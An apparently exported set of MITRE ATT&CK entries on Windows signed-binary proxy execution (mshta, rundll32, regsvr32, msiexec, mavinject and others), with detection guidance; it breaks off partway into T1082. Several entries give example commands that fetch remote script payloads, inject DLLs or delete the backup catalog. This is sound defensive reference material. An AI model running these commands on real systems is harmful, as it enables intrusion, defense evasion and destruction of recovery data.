{"ID":"T1218.004","name":"System Binary Proxy Execution: InstallUtil","description":"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)","url":"https://attack.mitre.org/techniques/T1218/004","created":"23 January 2020","last modified":"11 March 2022","version":"2.0","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control, Digital Certificate Validation","contributors":"Casey Smith; Travis Smith, Tripwire","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cybereason Chaes Nov 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Malwarebytes Saint Bot April 2021),"}
{"ID":"T1218.014","name":"System Binary Proxy Execution: MMC","description":"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation: abusing_com_reg)","url":"https://attack.mitre.org/techniques/T1218/014","created":"28 September 2021","last modified":"20 May 2022","version":"2.0","tactics":"Defense Evasion","detection":"Monitor processes and command-line parameters for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious. \n\nMonitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such as <code>services.msc</code> or <code>eventvwr.msc</code>. Invoking non-Microsoft .msc files may be an indicator of malicious activity. ","platforms":"Windows","data sources":"Command: Command Execution, File: File Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control, Digital Certificate Validation","contributors":"Wes Hurd","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1218.013","name":"System Binary Proxy Execution: Mavinject","description":"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)","url":"https://attack.mitre.org/techniques/T1218/013","created":"22 September 2021","last modified":"19 April 2022","version":"2.0","tactics":"Defense Evasion","detection":"Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity.\n\nAdversaries may rename abusable binaries to evade detections, but the argument <code>INJECTRUNNING</code> is required for mavinject.exe to perform [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001) and may therefore be monitored to alert malicious activity.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1218.005","name":"System Binary Proxy Execution: Mshta","description":"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)","url":"https://attack.mitre.org/techniques/T1218/005","created":"23 January 2020","last modified":"11 March 2022","version":"2.0","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious","platforms":"Windows","data sources":"Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control, Digital Certificate Validation","contributors":"@ionstorm; Ricardo Dias; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro Confucius APT Feb 2018),(Citation: TrendMicro EarthLusca 2022),(Citation: Cybereason Oceanlotus May 2017),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: FireEye Metamorfo Apr 2018),(Citation: Securelist MuddyWater Oct 2018),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: CISA AA20-301A Kimsuky),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: ESET T3 Threat Report 2021),(Citation: FireEye FIN7 April 2017),(Citation: Unit 42 TA551 Jan 2021),(Citation: EST Kimsuky April 2019),(Citation: fsecure NanHaiShu July 2016),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Symantec Shuckworm January 2022),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Github Koadic),(Citation: Lazarus APT January 2022),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Cylance Dust Storm),(Citation: KISA Operation Muzabi),(Citation: Qualys LolZarus),(Citation: Cofense RevengeRAT Feb 2019),(Citation: FireEye MuddyWater Mar 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft WDAC)"}
{"ID":"T1218.007","name":"System Binary Proxy Execution: Msiexec","description":"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)","url":"https://attack.mitre.org/techniques/T1218/007","created":"24 January 2020","last modified":"19 April 2022","version":"2.0","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control, Digital Certificate Validation","contributors":"Alexandros Pappas; Ziv Kaspersky, Cymptom","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: 360 Machete Sep 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: ESET LoudMiner June 2019),(Citation: Deep Instinct TA505 Apr 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: Rancor Unit42 June 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: Korean FSI TA505 2020),(Citation: Mandiant APT41),(Citation: Trend Micro TA505 June 2019),(Citation: Unit42 Molerat Mar 2020),(Citation: Cybereason TA505 April 2019),(Citation: Juniper IcedID June 2020),(Citation: Cybereason Clop Dec 2020),(Citation: Sophos Maze VM September 2020),(Citation: Sophos Ragnar May 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Casbaneiro Oct 2019),(Citation: Profero APT27 December 2020),(Citation: Kaspersky Duqu 2.0),(Citation: Microsoft AlwaysInstallElevated 2018)"}
{"ID":"T1218.008","name":"System Binary Proxy Execution: Odbcconf","description":"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) \n","url":"https://attack.mitre.org/techniques/T1218/008","created":"24 January 2020","last modified":"11 March 2022","version":"2.0","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control, Digital Certificate Validation","contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Cybereason Bumblebee August 2022),"}
{"ID":"T1218.009","name":"System Binary Proxy Execution: Regsvcs/Regasm","description":"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)","url":"https://attack.mitre.org/techniques/T1218/009","created":"23 January 2020","last modified":"11 March 2022","version":"2.0","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control, Digital Certificate Validation","contributors":"Casey Smith","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SentinelLabs Agent Tesla Aug 2020),"}
{"ID":"T1218.010","name":"System Binary Proxy Execution: Regsvr32","description":"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)","url":"https://attack.mitre.org/techniques/T1218/010","created":"23 January 2020","last modified":"21 April 2023","version":"2.1","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Anti-virus, Application control, Digital Certificate Validation","contributors":"Casey Smith","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Talos Cobalt Group July 2018),(Citation: Cybereason Astaroth Feb 2019),(Citation: Cybereason Valak May 2020),(Citation: JoeSecurity Egregor 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Fidelis INOCNATION),(Citation: DFIR Conti Bazar Nov 2021),(Citation: FireEye APT32 May 2017),(Citation: ATT QakBot April 2021),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Deep Instinct Black Basta August 2022),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Github Koadic),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: Sophos Ragnar May 2020),(Citation: ESET EvilNum July 2020),(Citation: Cyberint Qakbot May 2021),(Citation: KISA Operation Muzabi),(Citation: NCC Group Black Basta June 2022),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Trend Micro Black Basta October 2022),(Citation: RSA Shell Crew),(Citation: FireEye APT19),(Citation: Unit 42 Valak July 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Red Canary Qbot),(Citation: Lab52 WIRTE Apr 2019),(Citation: Unit42 Xbash Sept 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ThreatGeek Derusbi Converge),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Corio 2008),(Citation: Microsoft Windows Defender Application Control),(Citation: Secure Host Baseline EMET)"}
{"ID":"T1218.011","name":"System Binary Proxy Execution: Rundll32","description":"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ","url":"https://attack.mitre.org/techniques/T1218/011","created":"23 January 2020","last modified":"21 April 2023","version":"2.1","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.","platforms":"Windows","data sources":"Command: Command Execution, File: File Metadata, Module: Module Load, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Anti-virus, Application control, Digital Certificate Validation","contributors":"Casey Smith; Gareth Phillips, Seek Ltd.; James_inthe_box, Me; Ricardo Dias","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Crysys Skywiper),(Citation: Palo Alto Comnie),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: Costa AvosLocker May 2022),(Citation: Kaspersky Carbanak),(Citation: Crowdstrike Qakbot October 2020),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Korean FSI TA505 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Symantec Briba May 2012),(Citation: F-Secure Sofacy 2015),(Citation: McAfee Lazarus Jul 2020),(Citation: Unit 42 Bisonal July 2018),(Citation: Talos Seduploader Oct 2017),(Citation: Github Koadic),(Citation: Crowdstrike DNC June 2016),(Citation: ESET Telebots July 2017),(Citation: Secure List Bad Rabbit),(Citation: ESET Gamaredon June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Lotus Blossom Jun 2015),(Citation: RedCanary Mockingbird May 2020),(Citation: Arbor Musical Chairs Feb 2018),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Symantec Orangeworm April 2018),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Rancor Unit42 June 2018),(Citation: Cybereason Egregor Nov 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Unit 42 TA551 Jan 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Symantec Bumblebee June 2022),(Citation: Microsoft SIR Vol 19),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: Unit 42 NOKKI Sept 2018),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Volexity PowerDuke November 2016),(Citation: Malwarebytes Konni Aug 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Dell Sakula),(Citation: ESET GreyEnergy Oct 2018),(Citation: F-Secure CozyDuke),(Citation: CopyKittens Nov 2015),(Citation: SentinelOne NobleBaron June 2021),(Citation: FireEye Clandestine Fox),(Citation: ATT QakBot April 2021),(Citation: Prevailion EvilNum May 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: Volexity Exchange Marauder March 2021),(Citation: Talos ZxShell Oct 2014),(Citation: ESET Attor Oct 2019),(Citation: FireEye FELIXROOT July 2018),(Citation: ESET Zebrocy May 2019),(Citation: IBM MegaCortex),(Citation: Emissary Trojan Feb 2016),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: FireEye APT19),(Citation: ESET Hermetic Wizard March 2022),(Citation: Red Canary Qbot),(Citation: Cylance Shell Crew Feb 2017),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Trend Micro Black Basta October 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Novetta Winnti April 2015),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: Palo Alto Sofacy 06-2018),(Citation: Talos Nyetya June 2017),(Citation: ESET InvisiMole June 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Unit42 Redaman January 2019),(Citation: HP SVCReady Jun 2022),(Citation: Medium KONNI Jan 2020),(Citation: ESET Operation Groundbait),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Mandiant APT41),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: FireEye APT29 Nov 2018),(Citation: ESET RTM Feb 2017),(Citation: Cybereason TA505 April 2019),(Citation: Gigamon Berserk Bear October 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Microsoft Winnti Jan 2017),(Citation: Sophos Ragnar May 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Cyberint Qakbot May 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1218.012","name":"System Binary Proxy Execution: Verclsid","description":"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) ","url":"https://attack.mitre.org/techniques/T1218/012","created":"10 August 2020","last modified":"20 May 2022","version":"2.0","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1218","defenses bypassed":"Application control, Digital Certificate Validation","contributors":"Rodrigo Garcia, Red Canary","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Red Canary Verclsid.exe),"}
{"ID":"T1082","name":"System Information Discovery","description":"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)","url":"https://attack.mitre.org/techniques/T1082","created":"31 May 2017","last modified":"30 March 2023","version":"2.5","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather  detailed system information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.","platforms":"IaaS, Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Maril Vernon @shewhohacks; Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Palo Alto Comnie),(Citation: Proofpoint Azorult July 2018),(Citation: FireEye APT33 Sept 2017),(Citation: Talent-Jump Clambling February 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: ESET InvisiMole June 2018),(Citation: NCCGroup RokRat Nov 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: FireEye APT34 July 